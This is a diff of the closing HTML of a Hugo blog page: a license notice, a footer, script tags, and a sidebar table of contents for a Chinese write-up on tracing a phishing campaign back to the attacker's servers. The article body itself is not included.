+    <img src="https://camo.githubusercontent.com/e54ac5ad8cbe0d6686b5eb04b0f92aa9263ceda7/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f75303663797438757772766f33323172617374706b746b742f254536253934254242254535253837254242254538254237254146254535254245253834254546254243253931253230253238342532392e706e67" alt="攻击路径１ (4).png-215.2kB" />
+</a></p>
 
+    </div>
+</article>
+
+
+<div class="license markdown-body">
+    <blockquote>
+        <p>Unless otherwise noted, the content of this site is licensed under <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+               target="_blank">CC BY-NC-SA 4.0</a>.</p>
+    </blockquote>
 </div>
 
 
-  </main>
 
-  <footer>
-  <div class="copyright">
-    &copy; XEYE 2020 · <a href="https://creativecommons.org/licenses/by-sa/4.0">CC BY-SA 4.0</a>
-  </div>
+            </div>
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>TOC</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#一前言">一、前言</a></li>
+    <li><a href="#二信息收集">二、信息收集</a>
+      <ul>
+        <li><a href="#21-邮件正文">2.1 <strong>邮件正文：</strong></a></li>
+        <li><a href="#22-分析邮件内容"><strong>2.2 分析邮件内容</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#三渗透钓鱼网站">三、渗透钓鱼网站</a>
+      <ul>
+        <li><a href="#31-漏洞分析"><strong>3.1 漏洞分析</strong></a></li>
+        <li><a href="#32-陷入僵局"><strong>3.2 陷入僵局</strong></a></li>
+        <li><a href="#33-后台提权"><strong>3.3 后台提权</strong></a></li>
+        <li><a href="#34-日志分析"><strong>3.4 日志分析</strong></a></li>
+        <li><a href="#35-受害者身份识别">3.5 受害者身份识别</a></li>
+      </ul>
+    </li>
+    <li><a href="#四渗透邮件发送网站">四、渗透邮件发送网站</a>
+      <ul>
+        <li><a href="#41-漏洞扫描"><strong>4.1 漏洞扫描</strong></a></li>
+        <li><a href="#42-解密webshell"><strong>4.2 解密WebShell</strong></a></li>
+        <li><a href="#43-提权"><strong>4.3 提权</strong></a></li>
+        <li><a href="#44-追踪"><strong>4.4 追踪</strong></a></li>
+        <li><a href="#45-提取日志"><strong>4.5 提取日志</strong></a></li>
+        <li><a href="#46-关联分析"><strong>4.6 关联分析</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#五渗透攻击者傀儡服务器">五、渗透攻击者傀儡服务器</a>
+      <ul>
+        <li><a href="#51-漏洞扫描"><strong>5.1 漏洞扫描</strong></a></li>
+        <li><a href="#5２-漏洞利用"><strong>5.２ 漏洞利用</strong></a></li>
+        <li><a href="#5２-获取权限"><strong>5.２ 获取权限</strong></a></li>
+        <li><a href="#53-文件分析"><strong>5.3 文件分析</strong></a></li>
+        <li><a href="#54-提权"><strong>5.4 提权</strong></a></li>
+        <li><a href="#55-分析日志"><strong>5.5 分析日志</strong></a></li>
+        <li><a href="#56-访问ip热力图"><strong>5.6 访问IP热力图</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#六信息汇总">六、信息汇总</a>
+      <ul>
+        <li><a href="#61-组织信息"><strong>6.1 组织信息</strong></a></li>
+        <li><a href="#62-攻击手段"><strong>6.2 攻击手段</strong></a></li>
+        <li><a href="#63-攻击历史"><strong>6.3 攻击历史</strong></a></li>
+        <li><a href="#64-代理ip"><strong>6.4 代理IP</strong></a></li>
+        <li><a href="#65-被黑网站"><strong>6.5 被黑网站</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#七攻击路径还原">七、攻击路径还原</a></li>
+  </ul>
+</nav>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">Archives</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+        </div>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+</aside>
+        </div>
+        <div class="btn">
+    <div class="btn-toggle-mode">
+        <ion-icon name="contrast"></ion-icon>
+    </div>
+    <div class="btn-scroll-top">
+        <ion-icon name="chevron-up"></ion-icon>
+    </div>
+</div>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            <span>&copy; 2020 <a href="https://xeye.io">DSRKafuU</a> |
+                Powered by <a href="https://github.com/amzrk2/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> & <a href="https://gohugo.io/"
+                   target="_blank">Hugo</a> </span>
+        </div>
+    </div>
 </footer>
+    
+    <script async type="module" src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.esm.js"></script>
+<script async nomodule src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.js"></script>
 
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js"
-          integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0="
-          crossorigin="anonymous"></script>
+<script defer src="/assets/js/fuji.min.js"></script>
 
-  <script src="https://xeye.io/js/blog.js"></script>
-
-  
 </body>
+
 </html>
